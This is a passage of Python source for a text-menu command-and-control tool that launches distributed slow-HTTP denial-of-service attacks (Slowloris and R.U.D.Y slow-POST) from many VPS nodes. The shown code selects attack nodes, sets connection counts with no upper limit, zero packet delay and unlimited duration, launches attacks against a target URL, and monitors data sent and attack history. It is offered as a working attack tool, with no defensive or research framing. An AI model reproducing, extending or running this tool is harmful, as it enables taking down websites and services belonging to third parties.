            # Attack type selection
            print(f"\n{Colors.BOLD}ATTACK TYPE:{Colors.RESET}")
            print(f"{Colors.GREEN}[1]{Colors.RESET} Slowloris (ENHANCED Headers)")
            print(f"{Colors.GREEN}[2]{Colors.RESET} R.U.D.Y (ENHANCED POST - 10MB-100MB per connection)")
            
            attack_choice = self.input_with_prompt("Select attack type (1-2): ")
            attack_types = {'1': 'slowloris', '2': 'slow_post'}
            attack_type = attack_types.get(attack_choice)
            
            if not attack_type:
                print(f"{Colors.RED}Invalid attack type{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # VPS selection
            print(f"\n{Colors.BOLD}VPS SELECTION:{Colors.RESET}")
            vps_choice = self.input_with_prompt("Use all VPS? (Y/n): ", False) or 'y'
            
            if vps_choice.lower() == 'y':
                selected_vps = [vps[1] for vps in online_vps]
            else:
                print("Select VPS numbers (comma-separated, e.g., 1,2,3):")
                selection = self.input_with_prompt("VPS selection: ")
                if not selection:
                    return
                
                try:
                    indices = [int(x.strip()) - 1 for x in selection.split(',')]
                    selected_vps = [online_vps[i][1] for i in indices if 0 <= i < len(online_vps)]
                except (ValueError, IndexError):
                    print(f"{Colors.RED}Invalid VPS selection{Colors.RESET}")
                    input("Press Enter to continue...")
                    return
            
            if not selected_vps:
                print(f"{Colors.RED}No VPS selected{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Attack parameters - ENHANCED MODE
            print(f"\n{Colors.BOLD}ENHANCED ATTACK PARAMETERS:{Colors.RESET}")
            
            # Connection validation
            def validate_connections(conn_str):
                try:
                    conn = int(conn_str)
                    if conn < 1:
                        return False, "Connections must be at least 1"
                    return True, ""
                except ValueError:
                    return False, "Connections must be a number"
            
            # Delay validation
            def validate_delay(delay_str):
                try:
                    delay = int(delay_str)
                    if delay < 0:
                        return False, "Delay cannot be negative"
                    return True, ""
                except ValueError:
                    return False, "Delay must be a number"
            
            # Duration validation
            def validate_duration(duration_str):
                try:
                    duration = int(duration_str)
                    if duration < 0:
                        return False, "Duration cannot be negative"
                    return True, ""
                except ValueError:
                    return False, "Duration must be a number"
            
            connections_str = self.input_with_prompt("Connections per VPS (default 100, NO UPPER LIMIT): ", False, validate_connections) or "100"
            connections = int(connections_str)
            if connections > 20000:
                print(f"{Colors.RED}WARNING: EXTREMELY HIGH connection count ({connections:,}){Colors.RESET}")
                print("This will create massive server load. Continue? (y/N)")
                if input().strip().lower() != 'y':
                    connections = 1000
            
            delay_str = self.input_with_prompt("Delay between packets (0=MAXIMUM AGGRESSION, default 15): ", False, validate_delay) or "15"
            delay = int(delay_str)
            if delay == 0:
                print(f"{Colors.RED}ZERO DELAY MODE: Maximum aggression enabled{Colors.RESET}")
            
            duration_str = self.input_with_prompt("Attack duration in seconds (0 for unlimited): ", False, validate_duration) or "0"
            duration = int(duration_str)
            
            # Attack summary
            print(f"\n{Colors.BOLD}ENHANCED ATTACK SUMMARY:{Colors.RESET}")
            print(f"Target: {Colors.YELLOW}{target_url}{Colors.RESET}")
            attack_name = "Slowloris (ENHANCED)" if attack_type == "slowloris" else "R.U.D.Y (ENHANCED 10-100MB)"
            print(f"Attack Type: {Colors.YELLOW}{attack_name}{Colors.RESET}")
            print(f"VPS Nodes: {Colors.YELLOW}{len(selected_vps)}{Colors.RESET}")
            print(f"Connections per VPS: {Colors.YELLOW}{connections:,}{Colors.RESET}")
            print(f"Total Connections: {Colors.YELLOW}{len(selected_vps) * connections:,}{Colors.RESET}")
            print(f"Packet Delay: {Colors.YELLOW}{delay}s {'(ZERO DELAY - MAX AGGRESSION)' if delay == 0 else ''}{Colors.RESET}")
            print(f"Duration: {Colors.YELLOW}{'Unlimited' if duration == 0 else f'{duration}s'}{Colors.RESET}")
            
            if attack_type == 'slow_post':
                estimated_data = len(selected_vps) * connections * 50  # Avg 50MB per connection
                print(f"Estimated Total Data: {Colors.RED}{estimated_data:,} MB{Colors.RESET}")
            
            # Final confirmation
            print(f"\n{Colors.RED}LAUNCH ENHANCED ATTACK? (y/N): {Colors.RESET}", end="")
            confirm = input().strip().lower()
            
            if confirm != 'y':
                print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Create attack session
            session_name = f"Enhanced_{attack_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            target_host = target_url.replace('http://', '').replace('https://', '').split('/')[0]
            
            parameters = {
                'connections': connections,
                'delay': delay,
                'duration': duration
            }
            
            session_id, message = self.db_manager.create_attack_session(
                session_name, target_url, target_host, attack_type, selected_vps, parameters
            )
            
            if not session_id:
                print(f"{Colors.RED}[ERROR] Failed to create attack session: {message}{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Launch enhanced attack
            success = self.attack_manager.launch_attack(
                session_id, target_url, attack_type, selected_vps, parameters
            )
            
            if success:
                print(f"\n{Colors.GREEN}[SUCCESS] ENHANCED ATTACK LAUNCHED SUCCESSFULLY!{Colors.RESET}")
                print(f"{Colors.CYAN}[INFO] Session ID: {session_id}{Colors.RESET}")
                
                # Auto-start monitoring
                input(f"\n{Colors.YELLOW}Press Enter to start real-time monitoring...{Colors.RESET}")
                self.monitor_attack(session_id)
            else:
                print(f"{Colors.RED}[ERROR] Failed to launch attack{Colors.RESET}")
                input("Press Enter to continue...")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
            input("Press Enter to continue...")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error launching attack: {str(e)}")
            input("Press Enter to continue...")
    
    def monitor_attack(self, session_id=None):
        if session_id is None:
            # List active attacks
            if not self.attack_manager.active_attacks:
                print(f"{Colors.YELLOW}[INFO] No active attacks to monitor{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            print(f"\n{Colors.BOLD}ACTIVE ATTACKS:{Colors.RESET}")
            for sid, attack_info in self.attack_manager.active_attacks.items():
                attack_name = "Slowloris (ENHANCED)" if attack_info['attack_type'] == "slowloris" else "R.U.D.Y (ENHANCED)"
                print(f"Session {sid}: {attack_info['target_host']} ({attack_name})")
            
            try:
                session_input = self.input_with_prompt("Enter session ID to monitor: ")
                if not session_input or not session_input.isdigit():
                    return
                session_id = int(session_input)
            except (ValueError, KeyboardInterrupt):
                return
        
        if session_id not in self.attack_manager.active_attacks:
            print(f"{Colors.RED}[ERROR] Session not found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.GREEN}[MONITORING] Starting real-time attack monitoring (ENHANCED)...{Colors.RESET}")
        print(f"{Colors.YELLOW}[CONTROLS] Press Ctrl+C to stop monitoring{Colors.RESET}")
        time.sleep(2)
        
        try:
            while session_id in self.attack_manager.active_attacks:
                status_data = self.attack_manager.get_attack_status(session_id)
                attack_info = self.attack_manager.active_attacks[session_id]
                
                # Clear screen and display status
                self.clear_screen()
                
                print(f"{Colors.BOLD}{'='*90}{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.RED}     ENHANCED DISTRIBUTED SLOW HTTP ATTACK - LIVE MONITORING{Colors.RESET}")
                print(f"{Colors.BOLD}{'='*90}{Colors.RESET}")
                
                attack_name = "SLOWLORIS (ENHANCED)" if attack_info.get('attack_type') == 'slowloris' else "R.U.D.Y (ENHANCED)"
                print(f"\n{Colors.YELLOW}[SESSION] {session_id} - {attack_name}{Colors.RESET}")
                print(f"{Colors.CYAN}[TARGET]  {attack_info.get('target_host', 'Unknown')}{Colors.RESET}")
                
                if attack_info.get('start_time'):
                    uptime = datetime.now() - attack_info['start_time']
                    print(f"{Colors.GREEN}[UPTIME]  {str(uptime).split('.')[0]}{Colors.RESET}")
                
                # Parameters display
                params = attack_info.get('parameters', {})
                print(f"{Colors.PURPLE}[PARAMS]  Connections: {params.get('connections', 'N/A'):,} | Delay: {params.get('delay', 'N/A')}s{Colors.RESET}")
                
                print(f"\n{Colors.BOLD}VPS STATUS (ENHANCED):{Colors.RESET}")
                print(f"{'IP Address':<15} {'Status':<12} {'Processes':<10} {'Connections':<15} {'CPU':<12} {'Data Sent':<15} {'Uptime'}")
                print("-" * 95)
                
                total_processes = 0
                active_vps = 0
                total_bytes_sent = 0
                
                for vps_ip, data in status_data.items():
                    processes = data.get('active_processes', 0)
                    status = "ATTACKING" if processes > 0 else "IDLE"
                    color = Colors.GREEN if processes > 0 else Colors.RED
                    conn_info = data.get('connections_info', '')
                    cpu_info = data.get('cpu_info', '')
                    bytes_sent = data.get('bytes_sent', 0)
                    uptime = data.get('uptime', 0)
                    
                    # Format bytes sent
                    if bytes_sent > 1024*1024*1024:
                        bytes_display = f"{bytes_sent/(1024*1024*1024):.2f} GB"
                    elif bytes_sent > 1024*1024:
                        bytes_display = f"{bytes_sent/(1024*1024):.2f} MB"
                    elif bytes_sent > 1024:
                        bytes_display = f"{bytes_sent/1024:.2f} KB"
                    else:
                        bytes_display = f"{bytes_sent} B"
                    
                    # Format uptime
                    if uptime > 3600:
                        uptime_display = f"{uptime//3600}h {(uptime%3600)//60}m"
                    elif uptime > 60:
                        uptime_display = f"{uptime//60}m {uptime%60}s"
                    else:
                        uptime_display = f"{uptime}s"
                    
                    total_processes += processes
                    total_bytes_sent += bytes_sent
                    if processes > 0:
                        active_vps += 1
                    
                    print(f"{vps_ip:<15} {color}{status:<12}{Colors.RESET} {processes:<10} {conn_info:<15} {cpu_info:<12} {bytes_display:<15} {uptime_display}")
                
                # Format total bytes sent
                if total_bytes_sent > 1024*1024*1024:
                    total_bytes_display = f"{total_bytes_sent/(1024*1024*1024):.2f} GB"
                elif total_bytes_sent > 1024*1024:
                    total_bytes_display = f"{total_bytes_sent/(1024*1024):.2f} MB"
                elif total_bytes_sent > 1024:
                    total_bytes_display = f"{total_bytes_sent/1024:.2f} KB"
                else:
                    total_bytes_display = f"{total_bytes_sent} B"
                
                print(f"\n{Colors.BOLD}ENHANCED ATTACK STATISTICS:{Colors.RESET}")
                print(f"{Colors.YELLOW}Active VPS Nodes: {active_vps}/{len(status_data)}{Colors.RESET}")
                print(f"{Colors.YELLOW}Total Attack Processes: {total_processes}{Colors.RESET}")
                print(f"{Colors.RED}Total Data Sent: {total_bytes_display}{Colors.RESET}")
                
                est_connections = total_processes * params.get('connections', 100)
                print(f"{Colors.RED}Estimated Total Connections: {est_connections:,}{Colors.RESET}")
                
                print(f"\n{Colors.PURPLE}[CONTROLS] Press Ctrl+C to stop monitoring | Press 's' + Enter to stop attack{Colors.RESET}")
                
                # Non-blocking input check using select
                # This is the part that needs to be fixed
                # Instead of using select, we'll use a simple timeout approach
                print("Press 's' + Enter to stop attack or wait 5 seconds for update...", end="", flush=True)
                
                # Simple timeout approach
                start_time = time.time()
                user_input = ""
                
                # Set stdin to non-blocking mode
                import fcntl
                import termios
                
                # Save original terminal settings
                fd = sys.stdin.fileno()
                old_settings = termios.tcgetattr(fd)
                
                try:
                    # Set stdin to non-blocking
                    fl = fcntl.fcntl(fd, fcntl.F_GETFL)
                    fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
                    
                    # Check for input with timeout
                    while time.time() - start_time < 5:
                        try:
                            char = sys.stdin.read(1)
                            if char:
                                user_input += char
                                if char == '\n' and 's' in user_input.lower():
                                    print(f"{Colors.YELLOW}Stopping attack...{Colors.RESET}")
                                    self.attack_manager.stop_attack(session_id)
                                    break
                        except IOError:
                            pass
                        time.sleep(0.1)
                finally:
                    # Restore terminal settings
                    termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
                    
                print("\r" + " " * 60 + "\r", end="")  # Clear the line
                
            # If we got here and the attack is no longer active, it might have completed
            if session_id not in self.attack_manager.active_attacks:
                print(f"\n{Colors.GREEN}[INFO] Attack has completed or been stopped{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[INFO] Monitoring stopped{Colors.RESET}")
            
            # Ask if user wants to stop the attack
            try:
                stop_attack = input(f"{Colors.RED}Stop the enhanced attack? (y/N): {Colors.RESET}").strip().lower()
                if stop_attack == 'y':
                    self.attack_manager.stop_attack(session_id)
            except KeyboardInterrupt:
                pass
        
        input("\nPress Enter to continue...")
    
    def attack_history_menu(self):
        self.clear_screen()
        self.print_banner()
        
        sessions = self.db_manager.get_attack_sessions()
        
        print(f"{Colors.BOLD}ATTACK HISTORY{Colors.RESET}")
        print("=" * 30)
        
        if not sessions:
            print(f"\n{Colors.YELLOW}No attack history found{Colors.RESET}")
        else:
            print(f"\n{'ID':<4} {'Session Name':<25} {'Target':<20} {'Type':<15} {'Status':<10} {'Start Time'}")
            print("-" * 100)
            
            for session in sessions:
                start_time = session[6][:19] if session[6] else 'N/A'
                status_color = Colors.GREEN if session[8] == 'completed' else Colors.YELLOW if session[8] == 'running' else Colors.RED
                attack_type = "Slowloris (ENH)" if session[4] == 'slowloris' else "R.U.D.Y (ENH)"
                
                print(f"{session[0]:<4} {session[1][:24]:<25} {session[3][:19]:<20} {attack_type:<15} {status_color}{session[8]:<10}{Colors.RESET} {start_time}")
            
            # View details option
            print(f"\n{Colors.BOLD}OPTIONS:{Colors.RESET}")
            print(f"{Colors.GREEN}[1]{Colors.RESET} View Attack Details")
            print(f"{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu")
            
            choice = self.input_with_prompt("\nSelect option: ")
            if choice == '1':
                session_id = self.input_with_prompt("Enter session ID to view: ")
                if session_id and session_id.isdigit():
                    self.view_attack_details(int(session_id))
                    return
        
        input("\nPress Enter to continue...")
    
    def view_attack_details(self, session_id):
        """View detailed information about an attack session"""
        sessions = self.db_manager.get_attack_sessions()
        session = next((s for s in sessions if s[0] == session_id), None)
        
        if not session:
            print(f"{Colors.RED}[ERROR] Session not found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        self.clear_screen()
        print(f"{Colors.BOLD}ATTACK SESSION DETAILS: {session_id}{Colors.RESET}")
        print("=" * 50)
        
        # Basic info
        print(f"\n{Colors.BOLD}BASIC INFORMATION:{Colors.RESET}")
        print(f"Session Name: {session[1]}")
        print(f"Target URL: {session[2]}")
        print(f"Target Host: {session[3]}")
        print(f"Attack Type: {session[4]}")
        print(f"Status: {Colors.GREEN if session[8] == 'completed' else Colors.YELLOW if session[8] == 'running' else Colors.RED}{session[8]}{Colors.RESET}")
        print(f"Start Time: {session[6][:19] if session[6] else 'N/A'}")
        print(f"End Time: {session[7][:19] if session[7] else 'N/A'}")
        
        # Parameters
        if session[9]:  # parameters column
            try:
                parameters = json.loads(session[9])
                print(f"\n{Colors.BOLD}ATTACK PARAMETERS:{Colors.RESET}")
                for key, value in parameters.items():
                    print(f"{key}: {value}")
            except:
                pass
        
        # VPS nodes
        if session[5]:  # vps_nodes column
            try:
                vps_list = json.loads(session[5])
                print(f"\n{Colors.BOLD}VPS NODES ({len(vps_list)}):{Colors.RESET}")
                for i, vps in enumerate(vps_list, 1):
                    print(f"{i}. {vps}")
            except:
                pass
        
        # Results
        if session[10]:  # results column
            try:
                results = json.loads(session[10])
                print(f"\n{Colors.BOLD}ATTACK RESULTS:{Colors.RESET}")
                for key, value in results.items():
                    print(f"{key}: {value}")
            except:
                pass
        
        # Notes
        if session[12]:  # notes column
            print(f"\n{Colors.BOLD}NOTES:{Colors.RESET}")
            print(session[12])
        
        input("\nPress Enter to continue...")
    
    def system_status_menu(self):
        self.clear_screen()
        self.print_banner()
        
        print(f"{Colors.BOLD}SYSTEM STATUS{Colors.RESET}")
        print("=" * 20)
        
        # VPS Statistics
        vps_list = self.db_manager.get_all_vps()
        online_count = sum(1 for vps in vps_list if vps[5] == 'online')
        offline_count = len(vps_list) - online_count
        
        print(f"\n{Colors.BOLD}VPS NODES:{Colors.RESET}")
        print(f"Total VPS: {Colors.CYAN}{len(vps_list)}{Colors.RESET}")
        print(f"Online: {Colors.GREEN}{online_count}{Colors.RESET}")
        print(f"Offline: {Colors.RED}{offline_count}{Colors.RESET}")
        
        # Attack Statistics
        sessions = self.db_manager.get_attack_sessions()
        active_attacks = len(self.attack_manager.active_attacks)
        completed_attacks = sum(1 for s in sessions if s[8] == 'completed')
        failed_attacks = sum(1 for s in sessions if s[8] == 'failed')
        
        print(f"\n{Colors.BOLD}ATTACKS:{Colors.RESET}")
        print(f"Total Sessions: {Colors.CYAN}{len(sessions)}{Colors.RESET}")
        print(f"Active Attacks: {Colors.RED}{active_attacks}{Colors.RESET}")
        print(f"Completed Attacks: {Colors.GREEN}{completed_attacks}{Colors.RESET}")
        print(f"Failed Attacks: {Colors.YELLOW}{failed_attacks}{Colors.RESET}")
        
        # SSH Connections
        ssh_connections = len(self.ssh_manager.connections)
        print(f"\n{Colors.BOLD}SSH CONNECTIONS:{Colors.RESET}")
        print(f"Active SSH: {Colors.GREEN}{ssh_connections}{Colors.RESET}")
        print(f"Cached Credentials: {Colors.CYAN}{len(self.ssh_manager.connection_cache)}{Colors.RESET}")
        
        # System Information
        print(f"\n{Colors.BOLD}SYSTEM INFO:{Colors.RESET}")
        print(f"Database: {Colors.CYAN}{os.path.exists(self.db_manager.db_file)}{Colors.RESET}")
        print(f"Security Key: {Colors.CYAN}{os.path.exists('key.key')}{Colors.RESET}")
        print(f"Mode: {Colors.RED}ENHANCED EDITION v3.0{Colors.RESET}")
        print(f"Python Version: {Colors.CYAN}{sys.version.split()[0]}{Colors.RESET}")
        print(f"Platform: {Colors.CYAN}{sys.platform}{Colors.RESET}")
        
        # System resources
        try:
            import psutil
            print(f"\n{Colors.BOLD}SYSTEM RESOURCES:{Colors.RESET}")
            print(f"CPU Usage: {Colors.CYAN}{psutil.cpu_percent()}%{Colors.RESET}")
            print(f"Memory Usage: {Colors.CYAN}{psutil.virtual_memory().percent}%{Colors.RESET}")
            print(f"Disk Usage: {Colors.CYAN}{psutil.disk_usage('/').percent}%{Colors.RESET}")
        except ImportError:
            pass
        
        input("\nPress Enter to continue...")
    
    def run(self):
        while self.running:
            try:
                self.clear_screen()
                self.print_banner()
                self.print_menu()
                
                choice = input().strip()
                
                if choice == '1':
                    self.vps_management_menu()
                elif choice == '2':
                    self.launch_attack_menu()
                elif choice == '3':
                    self.monitor_attack()
                elif choice == '4':
                    self.attack_history_menu()
                elif choice == '5':
                    self.system_status_menu()
                elif choice == '0':
                    print(f"{Colors.YELLOW}[EXIT] Shutting down enhanced C2...{Colors.RESET}")
                    break
                else:
                    print(f"{Colors.RED}[ERROR] Invalid option{Colors.RESET}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[EXIT] Shutting down...{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
                logger.error(f"Runtime error: {str(e)}")
                input("Press Enter to continue...")

def main():
    # Check Python version
    if sys.version_info < (3, 6):
        print("Python 3.6+ required")
        sys.exit(1)
    
    # Check dependencies
    try:
        import paramiko
        from cryptography.fernet import Fernet
        import colorama
    except ImportError as e:
        print(f"Missing dependency: {e}")
        print("Please install: pip install paramiko cryptography colorama")
        sys.exit(1)
    
    # Create necessary directories
    os.makedirs('logs', exist_ok=True)
    os.makedirs('config', exist_ok=True)
    
    # Initialize and run TUI
    try:
        print("Starting Distributed Slow HTTP C2 - ENHANCED EDITION...")
        tui = SlowHTTPTUI()
        tui.run()
    except Exception as e:
        logger.critical(f"Fatal error: {str(e)}")
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
